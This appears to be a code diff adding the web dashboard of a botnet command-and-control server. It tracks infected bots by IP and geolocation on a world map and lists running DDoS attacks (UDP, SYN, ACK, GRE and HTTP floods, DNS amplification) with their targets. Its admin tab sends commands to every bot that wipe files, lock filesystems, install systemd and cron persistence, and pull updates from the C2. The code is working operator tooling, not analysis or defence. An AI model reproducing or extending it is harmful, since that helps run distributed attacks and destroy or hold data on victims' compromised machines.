+                    <i class="fas fa-user-shield text-cyber-primary"></i>
+                    Admin Console
+                </h2>
+                <button onclick="hideAdminPanel()" class="text-cyber-dim hover:text-cyber-primary transition-colors duration-200">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </button>
+            </div>
+            
+            <div class="flex border-b border-cyber-border">
+                <button id="users-tab" class="tab-button active" onclick="switchTab('users')">
+                    <i class="fas fa-users mr-2"></i> User Management
+                </button>
+                <button id="commands-tab" class="tab-button" onclick="switchTab('commands')">
+                    <i class="fas fa-terminal mr-2"></i> Bot Commands
+                </button>
+                <button id="stats-tab" class="tab-button" onclick="switchTab('stats')">
+                    <i class="fas fa-chart-bar mr-2"></i> Advanced Stats
+                </button>
+            </div>
+            
+            <div id="users-content" class="tab-content p-6 custom-scrollbar" style="max-height: 60vh; overflow-y: auto;">                <div class="mb-6">
+                    <button onclick="showAddUserForm()" class="cyber-btn py-2 px-4 rounded-md flex items-center justify-center gap-2">
+                        <i class="fas fa-user-plus"></i>
+                        <span>Create New User</span>
+                    </button>
+                </div>
+                
+                <div id="add-user-form" class="hidden mb-6 cyber-panel rounded-md border border-cyber-primary/30 custom-scrollbar" style="max-height: 80vh; overflow-y: auto;">
+                    <div class="px-6 py-4 border-b border-cyber-border flex justify-between items-center sticky top-0 bg-cyber-panel z-10">
+                        <h3 class="text-md font-semibold cyber-title flex items-center gap-2">
+                            <i class="fas fa-user-plus text-cyber-primary"></i>
+                            Create New User
+                        </h3>
+                        <button onclick="hideAddUserForm()" class="text-cyber-dim hover:text-cyber-primary transition-colors">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    
+                    <form action="/add-user" method="POST" autocomplete="off" class="p-6 space-y-6">
+                        <div class="space-y-2">
+                            <label for="new-username" class="block text-sm cyber-metric-label flex items-center gap-2">
+                                <i class="fas fa-user-tag text-cyber-secondary"></i>
+                                Username
+                            </label>
+                            <input type="text" id="new-username" name="username" required 
+                                   placeholder="hacker1337" 
+                                   autocapitalize="off" autocorrect="off" 
+                                   class="w-full cyber-input h-12 px-4 text-cyber-primary">
+                            <p class="text-xs text-cyber-dim mt-1 ml-7">
+                                Only letters, numbers and underscores allowed
+                            </p>
+                        </div>
+                        
+                        <div class="space-y-2">
+                            <label for="new-password" class="block text-sm cyber-metric-label flex items-center gap-2">
+                                <i class="fas fa-key text-cyber-secondary"></i>
+                                Password
+                            </label>
+                            <div class="relative">
+                                <input type="password" id="new-password" name="password" required 
+                                       placeholder="••••••••••••" 
+                                       autocomplete="new-password" 
+                                       class="w-full cyber-input h-12 px-4 pr-10 text-cyber-primary">
+                                <button type="button" onclick="togglePasswordVisibility('new-password')" 
+                                        class="absolute right-3 top-3 text-cyber-dim hover:text-cyber-primary">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                            <div class="text-xs text-cyber-dim mt-1 ml-7 space-y-1">
+                                <div class="flex items-center gap-2">
+                                    <i class="fas fa-check-circle text-xs" id="length-check"></i>
+                                    <span>Minimum 12 characters</span>
+                                </div>
+                                <div class="flex items-center gap-2">
+                                    <i class="fas fa-check-circle text-xs" id="case-check"></i>
+                                    <span>Uppercase & lowercase</span>
+                                </div>
+                                <div class="flex items-center gap-2">
+                                    <i class="fas fa-check-circle text-xs" id="number-check"></i>
+                                    <span>At least one number</span>
+                                </div>
+                                <div class="flex items-center gap-2">
+                                    <i class="fas fa-check-circle text-xs" id="special-check"></i>
+                                    <span>Special character</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="space-y-2">
+                            <label for="level" class="block text-sm cyber-metric-label flex items-center gap-2">
+                                <i class="fas fa-shield-alt text-cyber-secondary"></i>
+                                Access Level
+                            </label>
+                            <select id="level" name="level" required 
+                                    class="w-full cyber-select h-12 px-4 text-cyber-primary">
+                                <option value="User">User</option>
+                                <option value="Admin">Admin</option>
+                                <option value="Owner">Owner</option>
+                            </select>
+                            <p class="text-xs text-cyber-dim mt-1 ml-7">
+                                Owners have full system control
+                            </p>
+                        </div>
+                        
+                        <div class="space-y-2">
+                            <label for="expiry" class="block text-sm cyber-metric-label flex items-center gap-2">
+                                <i class="fas fa-calendar-times text-cyber-secondary"></i>
+                                Expiration Date (Optional)
+                            </label>
+                            <div class="relative">
+                                <input type="date" id="expiry" name="expiry" 
+                                       class="w-full cyber-input h-12 px-4 text-cyber-primary date-picker"
+                                       min="{{ now.Format "2006-01-02" }}">
+                                <i class="fas fa-calendar-alt absolute right-3 top-3 text-cyber-dim pointer-events-none"></i>
+                            </div>
+                            <p class="text-xs text-cyber-dim mt-1 ml-7">
+                                Leave blank for no expiration
+                            </p>
+                        </div>
+                        
+                        <div class="flex gap-4 pt-2 sticky bottom-0 bg-cyber-panel pb-2">
+                            <button type="submit" 
+                                    class="flex-1 cyber-btn h-12 flex items-center justify-center gap-2">
+                                <i class="fas fa-user-plus"></i>
+                                <span>Create User</span>
+                            </button>
+                            <button type="button" onclick="hideAddUserForm()" 
+                                    class="flex-1 bg-cyber-panel border border-cyber-border hover:border-cyber-primary text-cyber-primary h-12 rounded-md flex items-center justify-center gap-2 transition-all duration-200">
+                                <i class="fas fa-ban"></i>
+                                <span>Cancel</span>
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="custom-scrollbar overflow-x-auto">
+                    <table class="w-full cyber-table">
+                        <thead>
+                            <tr>
+                                <th class="px-6 py-3 text-left">Username</th>
+                                <th class="px-6 py-3 text-left">Level</th>
+                                <th class="px-6 py-3 text-left">Expires</th>
+                                <th class="px-6 py-3 text-left">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-cyber-border">
+                            {{range .Users}}
+                            <tr class="hover:bg-cyber-panel transition-colors">
+                                <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">{{.Username}}</td>
+                                <td class="px-6 py-4 whitespace-nowrap">
+                                    {{if eq .Level "Owner"}}
+                                    <span class="cyber-badge cyber-badge-owner">Owner</span>
+                                    {{else if eq .Level "Admin"}}
+                                    <span class="cyber-badge cyber-badge-admin">Admin</span>
+                                    {{else}}
+                                    <span class="cyber-badge cyber-badge-user">User</span>
+                                    {{end}}
+                                </td>
+                                <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">{{.Expire.Format "2006-01-02"}}</td>
+                                <td class="px-6 py-4 whitespace-nowrap">
+                                    <form action="/delete-user" method="get" class="inline">
+                                        <input type="hidden" name="username" value="{{.Username}}">
+                                        <button type="submit" class="inline-flex items-center px-3 py-1 rounded-md bg-cyber-accent/10 border border-cyber-accent/30 text-cyber-accent text-sm font-medium transition-all duration-200 hover:bg-cyber-accent/20">
+                                            <i class="fas fa-trash-alt mr-1"></i> Delete
+                                        </button>
+                                    </form>
+                                </td>
+                            </tr>
+                            {{end}}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div id="commands-content" class="tab-content hidden p-6 custom-scrollbar" style="max-height: 60vh; overflow-y: auto;">                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="command-card p-4 rounded-md">
+                        <div class="flex items-center justify-between mb-2">
+                            <h3 class="font-medium flex items-center gap-2 text-cyber-primary">
+                                <i class="fas fa-skull"></i>
+                                Kill Switch
+                            </h3>
+                            <span class="cyber-badge cyber-badge-destructive">DESTRUCTIVE</span>
+                        </div>
+                        <p class="text-sm text-cyber-dim mb-4">Wipes files from common directories on infected systems</p>
+                        <button onclick="sendBotCommand('!kill')" class="w-full cyber-btn py-2 px-4 rounded-md">
+                            <i class="fas fa-radiation mr-2"></i> Execute Kill Command
+                        </button>
+                    </div>
+                    
+                    <div class="command-card p-4 rounded-md">
+                        <div class="flex items-center justify-between mb-2">
+                            <h3 class="font-medium flex items-center gap-2 text-cyber-primary">
+                                <i class="fas fa-lock"></i>
+                                File Locker
+                            </h3>
+                            <span class="cyber-badge cyber-badge-destructive">DESTRUCTIVE</span>
+                        </div>
+                        <p class="text-sm text-cyber-dim mb-4">Locks down filesystem by making directories immutable</p>
+                        <button onclick="sendBotCommand('!lock')" class="w-full cyber-btn py-2 px-4 rounded-md">
+                            <i class="fas fa-lock mr-2"></i> Execute Lock Command
+                        </button>
+                    </div>
+                    
+                    <div class="command-card p-4 rounded-md">
+                        <div class="flex items-center justify-between mb-2">
+                            <h3 class="font-medium flex items-center gap-2 text-cyber-primary">
+                                <i class="fas fa-infinity"></i>
+                                Persistence
+                            </h3>
+                            <span class="cyber-badge cyber-badge-stealth">STEALTH</span>
+                        </div>
+                        <p class="text-sm text-cyber-dim mb-4">Installs persistence mechanism via systemd and cron</p>
+                        <button onclick="sendBotCommand('!persist')" class="w-full cyber-btn py-2 px-4 rounded-md">
+                            <i class="fas fa-save mr-2"></i> Install Persistence
+                        </button>
+                    </div>
+                    
+                    <div class="command-card p-4 rounded-md">
+                        <div class="flex items-center justify-between mb-2">
+                            <h3 class="font-medium flex items-center gap-2 text-cyber-primary">
+                                <i class="fas fa-sync-alt"></i>
+                                Update Bots
+                            </h3>
+                            <span class="cyber-badge cyber-badge-maintenance">MAINTENANCE</span>
+                        </div>
+                        <p class="text-sm text-cyber-dim mb-4">Force all bots to update from C2 server</p>
+                        <button onclick="sendBotCommand('!update')" class="w-full cyber-btn py-2 px-4 rounded-md">
+                            <i class="fas fa-cloud-download-alt mr-2"></i> Push Update
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="stats-content" class="tab-content hidden p-6 custom-scrollbar" style="max-height: 60vh; overflow-y: auto;">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div class="cyber-panel p-4 rounded-md">
+                        <h3 class="font-medium mb-4 flex items-center gap-2 text-cyber-primary">
+                            <i class="fas fa-microchip"></i>
+                            Bot Hardware Stats
+                        </h3>
+                        <div class="space-y-3">
+                            <div>
+                                <div class="flex justify-between text-sm mb-1">
+                                    <span class="text-cyber-dim">Average CPU Cores</span>
+                                    <span id="avg-cores" class="text-cyber-primary">-</span>
+                                </div>
+                                <div class="cyber-progress">
+                                    <div id="cores-bar" class="cyber-progress-bar" style="width: 0%"></div>
+                                </div>
+                            </div>
+                            <div>
+                                <div class="flex justify-between text-sm mb-1">
+                                    <span class="text-cyber-dim">Average RAM (GB)</span>
+                                    <span id="avg-ram" class="text-cyber-primary">-</span>
+                                </div>
+                                <div class="cyber-progress">
+                                    <div id="ram-bar" class="cyber-progress-bar" style="width: 0%"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="cyber-panel p-4 rounded-md md:col-span-2">
+                        <h3 class="font-medium mb-4 flex items-center gap-2 text-cyber-primary">
+                            <i class="fas fa-chart-line"></i>
+                            Attack Statistics
+                        </h3>
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                            <div class="text-center">
+                                <p class="text-sm text-cyber-dim">Total Attacks Today</p>
+                                <p class="text-2xl font-bold text-cyber-primary" id="total-attacks">0</p>
+                            </div>
+                            <div class="text-center">
+                                <p class="text-sm text-cyber-dim">Most Used Method</p>
+                                <p class="text-2xl font-bold text-cyber-primary" id="top-method">-</p>
+                            </div>
+                            <div class="text-center">
+                                <p class="text-sm text-cyber-dim">Average Duration</p>
+                                <p class="text-2xl font-bold text-cyber-primary" id="avg-duration">0s</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
+
+       <script id="bots-data" type="application/json">{{.BotsJSON}}</script>
+    
+    <script>
+        let activeAttacks = {};
+        let reconnectDelay = 1000;
+        let botData = [];
+        let cityCoordinatesCache = {};
+        let socket;
+
+        // Utility functions
+        function formatLocation(bot) {
+            const parts = [];
+            if (bot.City) parts.push(bot.City);
+            if (bot.Region && bot.Region !== bot.City) parts.push(bot.Region);
+            if (bot.Country) parts.push(bot.Country);
+            return parts.length > 0 ? parts.join(', ') : 'Location unknown';
+        }
+
+        function parseDurationToSeconds(durationStr) {
+            if (!durationStr) return 0;
+            const parts = durationStr.split(/\D+/).filter(Boolean);
+            if (parts.length === 1) return parseInt(parts[0]); // Just seconds
+            if (parts.length === 2) return (parseInt(parts[0]) * 60) + parseInt(parts[1]); // Minutes and seconds
+            return 0;
+        }
+
+        function formatRemainingTime(seconds) {
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return mins > 0 ? `${mins}m${secs.toString().padStart(2, '0')}s` : `${secs}s`;
+        }
+
+        // WebSocket connection
+        function connectWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+            socket = new WebSocket(protocol + window.location.host + '/ws');
+            
+            socket.onopen = function() {
+                console.log('WebSocket connected');
+                reconnectDelay = 1000;
+            };
+            
+            socket.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                updateDashboard(data);
+            };
+            
+            socket.onclose = function() {
+                console.log('WebSocket disconnected. Reconnecting...');
+                setTimeout(connectWebSocket, Math.min(reconnectDelay, 10000));
+                reconnectDelay *= 2;
+            };
+            
+            socket.onerror = function(err) {
+                console.error('WebSocket error:', err);
+                socket.close();
+            };
+        }
+
+        // Dashboard updates
+        function updateDashboard(data) {
+            updateMetrics(data);
+            updateBotsTable(data.bots);
+            updateAttacksTable(data.attacks);
+            updateMap(data.bots);
+        }
+
+        function updateMetrics(data) {
+            // Update bot count
+            document.querySelectorAll('.bot-count-metric').forEach(el => {
+                el.textContent = data.botCount;
+            });
+            
+            // Update attack count
+            document.querySelectorAll('.attack-count-metric').forEach(el => {
+                el.textContent = `${data.activeAttacks}/${data.attacks.length}`;
+            });
+        }
+
+        function updateBotsTable(bots) {
+            const tbody = document.querySelector('#bots-table tbody');
+            if (!tbody) return;
+            
+            if (!bots || bots.length === 0) {
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="5" class="px-6 py-4 text-center text-cyber-dim font-mono">No bots connected</td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            let html = '';
+            bots.forEach(bot => {
+                const isActive = new Date(bot.LastHeartbeat) > new Date(Date.now() - 120000);
+                
+                html += `
+                    <tr class="hover:bg-cyber-panel transition-colors cursor-pointer bot-row" data-bot='${JSON.stringify(bot)}'>
+                        <td class="px-6 py-4 whitespace-nowrap">
+                            <span class="status-indicator ${isActive ? 'status-active' : 'status-inactive'}"></span>
+                        </td>
+                        <td class="px-6 py-4 whitespace-nowrap font-mono text-cyber-primary">${bot.IP}</td>
+                        <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">
+                            ${formatLocation(bot)}
+                        </td>
+                        <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">${bot.Arch || 'unknown'}</td>
+                        <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">${new Date(bot.Time).toLocaleString()}</td>
+                    </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+            
+            // Reattach click handlers
+            document.querySelectorAll('.bot-row').forEach(row => {
+                row.addEventListener('click', function() {
+                    const bot = JSON.parse(this.dataset.bot);
+                    showBotDetails(bot);
+                });
+            });
+        }
+
+        function updateAttacksTable(attacks) {
+            const tbody = document.getElementById('attacks-table');
+            if (!tbody) return;
+            
+            if (!attacks || attacks.length === 0) {
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="5" class="px-6 py-4 text-center text-cyber-dim font-mono">No active engagements</td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            let html = '';
+            attacks.forEach(attack => {
+                const remaining = parseDurationToSeconds(attack.Remaining);
+                
+                html += `
+                    <tr class="hover:bg-cyber-panel transition-colors">
+                        <td class="px-6 py-4 whitespace-nowrap">
+                            <span class="attack-method-badge">
+                                ${FormatMethodIcon(attack.Method)} ${FormatAttackMethodName(attack.Method)}
+                            </span>
+                        </td>
+                        <td class="px-6 py-4 whitespace-nowrap font-mono text-cyber-primary">${attack.Target}:${attack.Port}</td>
+                        <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">${attack.Duration}</td>
+                        <td class="px-6 py-4 whitespace-nowrap text-cyber-primary">${attack.Remaining}</td>
+                        <td class="px-6 py-4 whitespace-nowrap">
+                            <a href="/stop-attack?id=${attack.ID}" class="inline-flex items-center px-3 py-1 rounded-md bg-cyber-accent/10 border border-cyber-accent/30 text-cyber-accent text-sm font-medium transition-all duration-200 hover:bg-cyber-accent/20">
+                                <i class="fas fa-stop mr-1"></i> Terminate
+                            </a>
+                        </td>
+                    </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+        }
+
+        // Map functions
+        function initWorldMap(bots) {
+            const map = L.map('world-map', {
+                zoomControl: false,
+                attributionControl: false
+            }).setView([20, 0], 2);
+
+            L.tileLayer('https://tiles.stadiamaps.com/tiles/alidade_smooth_dark/{z}/{x}/{y}{r}.png', {
+                maxZoom: 20,
+                attribution: '&copy; <a href="https://stadiamaps.com/">Stadia Maps</a>'
+            }).addTo(map);
+
+            const markers = L.markerClusterGroup({
+                spiderfyOnMaxZoom: true,
+                showCoverageOnHover: false,
+                zoomToBoundsOnClick: true,
+                maxClusterRadius: 40
+            });
+
+            updateMapMarkers(markers, bots);
+            map.addLayer(markers);
+
+            window.map = map;
+            window.markers = markers;
+        }
+
+        function updateMap(bots) {
+            if (!window.map) {
+                initWorldMap(bots);
+                return;
+            }
+
+            if (window.markers) {
+                window.map.removeLayer(window.markers);
+            }
+
+            const markers = L.markerClusterGroup({
+                spiderfyOnMaxZoom: true,
+                showCoverageOnHover: false,
+                zoomToBoundsOnClick: true,
+                maxClusterRadius: 40
+            });
+
+            updateMapMarkers(markers, bots);
+            window.map.addLayer(markers);
+            window.markers = markers;
+        }
+
+        function updateMapMarkers(markers, bots) {
+            if (!bots || bots.length === 0) return;
+
+            const botsByLocation = {};
+            bots.forEach(bot => {
+                const locationKey = `${bot.City || 'Unknown'}-${bot.Country || 'Unknown'}`;
+                if (!botsByLocation[locationKey]) {
+                    botsByLocation[locationKey] = {
+                        city: bot.City,
+                        country: bot.Country,
+                        bots: []
+                    };
+                }
+                botsByLocation[locationKey].bots.push(bot);
+            });
+
+            Object.values(botsByLocation).forEach(location => {
+                if (location.bots[0].Latitude && location.bots[0].Longitude) {
+                    addMarker(markers, location.bots[0].Latitude, location.bots[0].Longitude, location);
+                } else {
+                    getCoordinatesForLocation(location.city, location.country)
+                        .then(coords => {
+                            if (coords) {
+                                addMarker(markers, coords.lat, coords.lon, location);
+                            }
+                        });
+                }
+            });
+        }
+
+        function addMarker(markers, lat, lon, location) {
+            const marker = L.marker([lat, lon], {
+                icon: L.divIcon({
+                    className: 'bot-marker',
+                    html: `<div class="marker-pin"></div>`,
+                    iconSize: [30, 42],
+                    iconAnchor: [15, 42]
+                })
+            }).bindPopup(`
+                <div style="min-width: 200px;" class="text-cyber-dark">
+                    <b class="text-cyber-primary">${location.city || 'Unknown location'}</b><br>
+                    <small class="text-cyber-dim">${location.country || 'Unknown country'}</small><br>
+                    <div class="grid grid-cols-2 gap-1 mt-1">
+                        <div><small>Bots: ${location.bots.length}</small></div>
+                        <div><small>First IP: ${location.bots[0].IP}</small></div>
+                    </div>
+                </div>
+            `);
+            
+            markers.addLayer(marker);
+        }
+
+        async function getCoordinatesForLocation(city, country) {
+            if (!city) return null;
+            
+            const cacheKey = `${city}-${country}`;
+            if (cityCoordinatesCache[cacheKey]) {
+                return cityCoordinatesCache[cacheKey];
+            }
+
+            try {
+                const response = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(city)}${country ? ',' + encodeURIComponent(country) : ''}&limit=1`);
+                const data = await response.json();
+                if (data.length > 0) {
+                    const coords = {
+                        lat: parseFloat(data[0].lat),
+                        lon: parseFloat(data[0].lon)
+                    };
+                    cityCoordinatesCache[cacheKey] = coords;
+                    return coords;
+                }
+            } catch (error) {
+                console.error('Error fetching coordinates:', error);
+            }
+            return null;
+        }
+
+        // Bot details
+        function showBotDetails(bot) {
+            const detailsEl = document.getElementById('bot-details');
+            if (!detailsEl) return;
+            
+            detailsEl.classList.remove('hidden');
+            
+            document.getElementById('detail-ip').textContent = bot.IP || '-';
+            document.getElementById('detail-location').textContent = formatLocation(bot);
+            document.getElementById('detail-arch').textContent = bot.Arch || 'unknown';
+            document.getElementById('detail-cores').textContent = bot.Cores ? bot.Cores.toString() : 'unknown';
+            document.getElementById('detail-ram').textContent = bot.RAM ? `${bot.RAM.toFixed(1)} GB` : 'unknown';
+            document.getElementById('detail-time').textContent = bot.Time ? new Date(bot.Time).toLocaleString() : 'unknown';
+        }
+
+        function hideBotDetails() {
+            document.getElementById('bot-details').classList.add('hidden');
+        }
+
+        // Attack control
+        function stopAllAttacks() {
+            if (!confirm('Are you sure you want to stop all active attacks?')) return;
+            
+            fetch('/stop-all-attacks', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                credentials: 'same-origin'
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.text();
+                }
+                throw new Error('Failed to stop attacks');
+            })
+            .then(message => {
+                alert(message);
+                location.reload();
+            })
+            .catch(error => {
+                alert(`Error: ${error.message}`);
+            });
+        }
+
+        // Admin functions
+        function sendBotCommand(command) {
+            if (!confirm(`Execute "${command}" on all bots?`)) return;
+            
+            fetch('/admin-command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `command=${encodeURIComponent(command)}`,
+                credentials: 'same-origin'
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.text();
+                }
+                throw new Error('Command failed');
+            })
+            .then(message => {
+                alert(message);
+            })
+            .catch(error => {
+                alert(`Error: ${error.message}`);
+            });
+        }
+
+        // Helper functions for template compatibility
+        function FormatMethodIcon(method) {
+            const icons = {
+                '!udpflood': '<i class="fas fa-bolt"></i>',
+                '!udpsmart': '<i class="fas fa-brain"></i>',
+                '!tcpflood': '<i class="fas fa-network-wired"></i>',
+                '!synflood': '<i class="fas fa-sync"></i>',
+                '!ackflood': '<i class="fas fa-reply"></i>',
+                '!greflood': '<i class="fas fa-project-diagram"></i>',
+                '!dns': '<i class="fas fa-server"></i>',
+                '!http': '<i class="fas fa-globe"></i>'
+            };
+            return icons[method] || '';
+        }
+
+        function FormatAttackMethodName(method) {
+            const names = {
+                '!udpflood': 'UDP Flood',
+                '!udpsmart': 'UDP Smart',
+                '!tcpflood': 'TCP Flood',
+                '!synflood': 'SYN Flood',
+                '!ackflood': 'ACK Flood',
+                '!greflood': 'GRE Flood',
+                '!dns': 'DNS Amplification',
+                '!http': 'HTTP Flood'
+            };
+            return names[method] || method;
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            connectWebSocket();
+            
+            try {
+                const bots = JSON.parse(document.getElementById('bots-data').textContent);
+                initWorldMap(bots);
+            } catch (e) {
+                console.error('Initialization error:', e);
+            }
+            
+            // Profile dropdown
+            document.getElementById('profile-button').addEventListener('click', function(e) {
+                e.stopPropagation();
+                document.getElementById('profile-dropdown').classList.toggle('hidden');
+            });
+
+            document.addEventListener('click', function() {
+                document.getElementById('profile-dropdown').classList.add('hidden');
+            });
+
+            // Admin panel
+            document.getElementById('admin-overlay').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    hideAdminPanel();
+                }
+            });
+
+            // Password visibility toggle
+            document.getElementById('new-password')?.addEventListener('input', function(e) {
+                const password = e.target.value;
+                const checks = {
+                    'length-check': password.length >= 12,
+                    'case-check': /[a-z]/.test(password) && /[A-Z]/.test(password),
+                    'number-check': /\d/.test(password),
+                    'special-check': /[!@#$%^&*]/.test(password)
+                };
+                
+                Object.entries(checks).forEach(([id, isValid]) => {
+                    const icon = document.getElementById(id);
+                    icon.style.color = isValid ? '#00f0ff' : '#64748b';
+                    icon.classList.toggle('fa-check-circle', isValid);
+                    icon.classList.toggle('fa-times-circle', !isValid);
+                });
+            });
+        });
+
+        // Admin panel functions
+        function showAdminPanel() {
+            document.getElementById('admin-overlay').classList.add('active');
+            switchTab('users');
+        }
+
+        function hideAdminPanel() {
+            document.getElementById('admin-overlay').classList.remove('active');
+        }
+
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.add('hidden');
+            });
+            document.querySelectorAll('.tab-button').forEach(button => {
+                button.classList.remove('active');
+            });
+
+            document.getElementById(`${tabName}-content`).classList.remove('hidden');
+            document.getElementById(`${tabName}-tab`).classList.add('active');
+        }
+
+        function showAddUserForm() {
+            document.getElementById('add-user-form').classList.remove('hidden');
+        }
+
+        function hideAddUserForm() {
+            document.getElementById('add-user-form').classList.add('hidden');
+        }
+
+        function togglePasswordVisibility(inputId) {
+            const input = document.getElementById(inputId);
+            const icon = input.nextElementSibling.querySelector('i');
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+    </script>
+</body>
+</html>
